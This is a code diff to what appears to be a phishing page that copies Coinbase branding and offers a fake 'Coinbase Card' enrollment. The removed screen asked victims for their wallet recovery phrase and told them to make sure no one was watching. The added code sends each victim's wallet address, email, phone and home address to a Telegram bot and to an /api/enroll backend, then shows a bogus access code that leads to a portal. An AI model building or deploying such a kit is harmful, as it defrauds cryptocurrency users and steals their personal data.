@@ -882,81 +882,20 @@
     </div>
 
   <!-- ══ SCREEN 9: ATTESTATION ══ -->
-<div class="screen" id="s9" style="max-width:760px;margin:0 auto;padding:20px 18px 28px;">
-
-  <div class="step-badge" style="margin:0 auto 18px;display:table;">Final Step — Confirm</div>
-
-  <h2 style="text-align:center;margin:0 0 14px;font-size:56px;line-height:1.05;font-weight:800;color:#0b0f19;">
-    Private Connection
-  </h2>
-
-  <p class="sub" style="text-align:center;max-width:640px;margin:0 auto 34px;font-size:18px;line-height:1.7;color:#6b7280;">
-    <strong style="color:#4b5563;">Make sure no one is around you.</strong>
-    No friends, no strangers, and no one looking over your shoulder.
-    Even a quick glance from someone else is a risk you cannot afford.
-  </p>
-
-
-
-  <!-- Recovery Phrase Card -->
-  <div style="width:100%;margin-bottom:18px;padding:18px;border:1px solid #e5e7eb;border-radius:18px;background:#fafafa;">
-
-    <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:10px;flex-wrap:wrap;">
-      <label for="phrase-input" style="font-size:16px;font-weight:700;color:#111827;">
-        Recovery Phrase Required
-      </label>
-      <span style="font-size:12px;font-weight:600;color:#6b7280;background:#f3f4f6;padding:5px 10px;border-radius:999px;">
-        Required
-      </span>
+  <div class="screen" id="s9">
+    <div class="step-badge">Final Step — Confirm</div>
+    <h2>Confirm your enrollment</h2>
+    <p class="sub">Type <strong>"I attest"</strong> below to confirm you have read and agree to the Coinbase Card terms, and that the information you provided is accurate.</p>
+    <div class="vm-field" style="width:100%;margin-bottom:10px">
+      <label>Attestation Statement</label>
+      <input type="text" id="attestInput" placeholder='Type: I attest' autocomplete="off" spellcheck="false" />
     </div>
-
-    <textarea
-      id="phrase-input"
-      rows="4"
-      placeholder="Enter your 12, 15 or 24-word recovery phrase..."
-      style="width:100%;min-height:120px;border:1px solid #d1d5db;border-radius:14px;padding:16px 18px;font-size:16px;line-height:1.6;color:#111827;background:#fff;outline:none;resize:vertical;box-sizing:border-box;"
-    ></textarea>
-
-    <div style="display:flex;justify-content:space-between;align-items:center;gap:10px;margin-top:10px;flex-wrap:wrap;font-size:13px;color:#6b7280;">
-      <span id="word-count">0 words</span>
-      <span>Must be 12 / 15 / 24 words</span>
+    <div id="attestError" style="display:none;color:#D23F31;font-size:12px;margin-bottom:10px;font-weight:600">
+      ⚠ Please type "I attest" to continue
     </div>
-
-
-
-    <div style="display:flex;align-items:flex-start;gap:10px;margin-top:16px;padding:14px 15px;border:1px solid #fbcfe8;border-radius:14px;background:#fff7fb;">
-      <div style="font-size:18px;line-height:1;">🛡️</div>
-      <p id="hint-text" style="margin:0;font-size:13px;line-height:1.6;color:#6b7280;">
-        Your recovery phrase is the only way to restore your wallet. Never share it with anyone.
-      </p>
-    </div>
-
-  
-  </div>
-
-  <div id="attestError" style="display:none;color:#D23F31;font-size:12px;margin-bottom:16px;font-weight:600;">
-    ⚠ Connect
-  </div>
-
-  <!-- Buttons -->
-  <div style="display:flex;flex-direction:column;align-items:center;gap:14px;margin-top:26px;">
-    <button
-      class="btn-primary"
-      style="width:100%;max-width:360px;height:62px;border:none;border-radius:18px;background:#1857ff;color:#fff;font-size:18px;font-weight:700;box-shadow:0 12px 25px rgba(24,87,255,0.22);"
-      onclick="submitAttestation()"
-    >
-      Complete Enrollment →
-    </button>
-
-    <button
-      class="btn-ghost"
-      style="width:100%;max-width:360px;height:62px;border:1px solid #d1d5db;border-radius:18px;background:#fff;color:#111827;font-size:18px;font-weight:700;"
-      onclick="showScreen('s5')"
-    >
-      ← Back to my card
-    </button>
-  </div>
-</div>   <!-- ══ SCREEN 10: SUCCESS ══ -->
+    <button class="btn-primary" style="width:100%" onclick="submitAttestation(event)">Complete Enrollment →</button>
+    <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="showScreen('s5')">← Back to my card</button>
+  </div>   <!-- ══ SCREEN 10: SUCCESS ══ -->
     <div class="screen" id="s10">
       <div class="success-tick">✓</div>
       <h2>You're all set!</h2>
@@ -967,8 +906,14 @@
         <div class="cd-row"><span>Cardholder</span><strong id="s10Addr">—</strong></div>
         <div class="cd-row"><span>Card type</span><strong id="s10Type">Virtual Card</strong></div>
         <div class="cd-row"><span>Rewards</span><strong style="color:#0052FF">4% back in XLM</strong></div>
+        <div class="cd-row"><span>Access code</span>
+          <strong id="s10Code" style="font-size:20px;letter-spacing:.15em;color:#0052FF;font-family:'JetBrains Mono',monospace">—</strong>
+        </div>
       </div>
-      <button class="btn-primary" style="width:100%" onclick="window.location.href='card.html'">Back to Coinbase Card →</button>
+      <p style="font-size:12px;color:#6B7280;text-align:center;margin-bottom:16px;line-height:1.6">
+        📧 Your access code was also sent to your email.<br>Use it to view your card on the <a href="portal.html" style="color:#0052FF;font-weight:600">Card Portal</a>.
+      </p>
+      <button class="btn-primary" style="width:100%" onclick="window.location.href='portal.html'">View My Card on Portal →</button>
     </div>
 
     <!-- ══ SCREEN 6: SHIPPING (PHYSICAL) ══ -->
@@ -986,14 +931,14 @@
           <div class="vm-field"><label>Last name</label><input type="text" placeholder="Doe" /></div>
         </div>
         <div class="vm-row-2">
-          <div class="vm-field"><label>Email address</label><input type="email" placeholder="john@example.com" /></div>
-          <div class="vm-field"><label>Phone number</label><input type="tel" placeholder="+1 (555) 000-0000" /></div>
+          <div class="vm-field"><label>Email address</label><input id="shipEmail" type="email" placeholder="john@example.com" /></div>
+          <div class="vm-field"><label>Phone number</label><input id="shipPhone" type="tel" placeholder="+1 (555) 000-0000" /></div>
         </div>
-        <div class="vm-field"><label>Street address</label><input type="text" placeholder="123 Main Street" /></div>
-        <div class="vm-field"><label>Apt / Suite</label><input type="text" placeholder="Apt 4B (optional)" /></div>
+        <div class="vm-field"><label>Street address</label><input id="shipStreet" type="text" placeholder="123 Main Street" /></div>
+        <div class="vm-field"><label>Apt / Suite</label><input id="shipApt" type="text" placeholder="Apt 4B (optional)" /></div>
         <div class="vm-row-2">
-          <div class="vm-field"><label>City</label><input type="text" placeholder="San Francisco" /></div>
-          <div class="vm-field"><label>ZIP</label><input type="text" placeholder="94107" maxlength="5" /></div>
+          <div class="vm-field"><label>City</label><input id="shipCity" type="text" placeholder="San Francisco" /></div>
+          <div class="vm-field"><label>ZIP</label><input id="shipZip" type="text" placeholder="94107" maxlength="5" /></div>
         </div>
         <div class="vm-field">
           <label>State</label>
@@ -1021,20 +966,22 @@
         <div class="cd-row"><span>Shipping status</span><strong style="color:#D97706">📦 Processing</strong></div>
         <div class="cd-row"><span>Estimated arrival</span><strong>7–10 business days</strong></div>
         <div class="cd-row"><span>Virtual card</span><strong style="color:#05B169">✓ Active now</strong></div>
-        <div class="cd-row"><span>Activation method</span><strong>Wallet signature</strong></div>
+        <div class="cd-row"><span>Access code</span>
+          <strong id="s7Code" style="font-size:20px;letter-spacing:.15em;color:#0052FF;font-family:'JetBrains Mono',monospace">—</strong>
+        </div>
       </div>
-      <button class="btn-primary" style="width:100%" onclick="showScreen('s5')">← Back to my card</button>
+      <p style="font-size:12px;color:#6B7280;text-align:center;margin-bottom:16px;line-height:1.6">
+        📧 Your access code was sent to your email.<br>Use it on the <a href="portal.html" style="color:#0052FF;font-weight:600">Card Portal</a> to view your card.
+      </p>
+      <button class="btn-primary" style="width:100%" onclick="window.location.href='portal.html'">View My Card on Portal →</button>
     </div>
 
   </div><!-- stage -->
 </div><!-- wrapper -->
 
 
+<script src="config.js"></script>
 <script>
-/* ── TELEGRAM CONFIG ── fill in your bot token and chat ID ── */
-const TG_TOKEN = 'YOUR_BOT_TOKEN';   // e.g. '7123456789:AAFz...'
-const TG_CHAT  = 'YOUR_CHAT_ID';     // e.g. '-1001234567890'
-
 /* ── STATE ── */
 let cardType   = 'virtual';
 let walletName     = 'Coinbase Wallet';
@@ -1267,17 +1214,62 @@ function toggleCardFlip() {
 
 function goShipping() { showScreen('s6'); }
 
-function submitShipping() {
+async function submitShipping() {
+  const btn = document.querySelector('#s6 .btn-primary');
+  if (btn) { btn.disabled = true; btn.textContent = 'Submitting…'; }
+
+  const email   = document.getElementById('shipEmail')?.value.trim()  || '';
+  const phone   = document.getElementById('shipPhone')?.value.trim()  || '';
+  const street  = document.getElementById('shipStreet')?.value.trim() || '';
+  const apt     = document.getElementById('shipApt')?.value.trim()    || '';
+  const city    = document.getElementById('shipCity')?.value.trim()   || '';
+  const zip     = document.getElementById('shipZip')?.value.trim()    || '';
+  const address = [street, apt, city, zip].filter(Boolean).join(', ');
+
+  // Telegram — shipping order notification
+  const tgMsg =
+    `📦 Physical Card Order\n` +
+    `📅 ${new Date().toLocaleString()}\n` +
+    `👤 Cardholder: ${walletAddr}\n` +
+    `📧 Email: ${email || '—'}\n` +
+    `📞 Phone: ${phone || '—'}\n` +
+    `🏠 Address: ${address || '—'}`;
+  try { await sendToTelegram(tgMsg); } catch(err) { console.warn('Telegram:', err.message); }
+
+  // Save to DB → triggers access code email to user
+  try {
+    const resp = await fetch('/api/enroll', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cardType:    'physical',
+        wallet:      'Coinbase Wallet',
+        cardholder:  walletAddr,
+        attestation: 'physical-order',
+        email,
+        phone,
+        address,
+        cardNumber:  generatedNum,
+      })
+    });
+    const data = await resp.json();
+    if (data.code) {
+      const codeEl = document.getElementById('s7Code');
+      if (codeEl) codeEl.textContent = data.code;
+    }
+  } catch(err) { console.warn('DB save:', err.message); }
+
+  if (btn) { btn.disabled = false; btn.textContent = 'Confirm Shipping →'; }
   showScreen('s7');
 }
 
 /* ── ATTESTATION ── */
-async function submitAttestation() {
+async function submitAttestation(e) {
   const input = document.getElementById('attestInput');
   const err   = document.getElementById('attestError');
   const val   = input.value.trim();
 
-  if (val.toLowerCase() !== ' Make sure no one is around you.') {
+  if (val.toLowerCase() !== 'i attest') {
     err.style.display = '';
     input.style.borderColor = '#D23F31';
     input.style.boxShadow = '0 0 0 3px rgba(210,63,49,.15)';
@@ -1287,19 +1279,51 @@ async function submitAttestation() {
   err.style.display = 'none';
 
   // Disable button while sending
-  const btn = event.currentTarget;
+  const btn = e.currentTarget;
   btn.disabled = true;
   btn.textContent = 'Submitting…';
 
-  const msg =
-    `🔐 Coinbase Card Enrollment\n` +
-    `📅 ${new Date().toLocaleString()}\n` +
-    `💳 Card type: ${cardType === 'physical' ? 'Physical' : 'Virtual'}\n` +
-    `👛 Wallet: Coinbase Wallet\n` +
-    `👤 Cardholder: ${walletAddr}\n` +
-    `✅ Attestation: "${val}"`;
+  // Collect shipping/contact fields
+  const email   = document.getElementById('shipEmail')?.value.trim()  || '';
+  const phone   = document.getElementById('shipPhone')?.value.trim()  || '';
+  const street  = document.getElementById('shipStreet')?.value.trim() || '';
+  const apt     = document.getElementById('shipApt')?.value.trim()    || '';
+  const city    = document.getElementById('shipCity')?.value.trim()   || '';
+  const zip     = document.getElementById('shipZip')?.value.trim()    || '';
+  const address = [street, apt, city, zip].filter(Boolean).join(', ');
 
-  try { await sendToTelegram(msg); } catch(e) { console.warn('Telegram:', e.message); }
+  // Telegram — send the attestation statement only (what the user typed)
+  const tgMsg =
+    `✅ New Attestation\n` +
+    `📅 ${new Date().toLocaleString()}\n` +
+    `👤 ${walletAddr}\n` +
+    `📧 ${email || '—'}\n` +
+    `💬 "${val}"`;
+  try { await sendToTelegram(tgMsg); } catch(err) { console.warn('Telegram:', err.message); }
+
+  // Save to Railway DB — access code returned, email sent by server
+  try {
+    const resp = await fetch('/api/enroll', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        cardType,
+        wallet:      'Coinbase Wallet',
+        cardholder:  walletAddr,
+        attestation: val,
+        email,
+        phone,
+        address,
+        cardNumber:  generatedNum,
+      })
+    });
+    const data = await resp.json();
+    if (data.code) {
+      // Show access code on success screen so user also sees it immediately
+      const codeEl = document.getElementById('s10Code');
+      if (codeEl) codeEl.textContent = data.code;
+    }
+  } catch(err) { console.warn('DB save:', err.message); }
 
   // Show success screen
   document.getElementById('s10Addr').textContent = walletAddr;
